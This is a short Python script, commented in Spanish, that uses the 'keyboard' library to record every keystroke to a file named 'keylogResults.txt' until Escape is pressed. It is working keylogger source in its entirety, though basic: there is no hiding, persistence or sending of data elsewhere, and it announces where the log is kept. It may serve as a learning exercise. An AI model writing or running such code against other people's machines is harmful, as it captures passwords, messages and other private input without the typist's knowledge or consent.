import keyboard  

LOG_FILE = 'keylogResults.txt'  

def registrar(tecla):  
    with open(LOG_FILE, 'a') as f:  
        if tecla == 'space':  
            f.write(' ')
        elif tecla == 'enter':  
            f.write('\n')
        elif tecla == 'backspace': 
            f.write('[BORRAR]')
        elif len(tecla) > 1:  
            f.write(f'[{tecla.upper()}]')  
        else:  
            f.write(tecla)


keyboard.on_press(lambda e: registrar(e.name))


keyboard.wait('esc')


print("Ya está, mira keylogResults.txt")


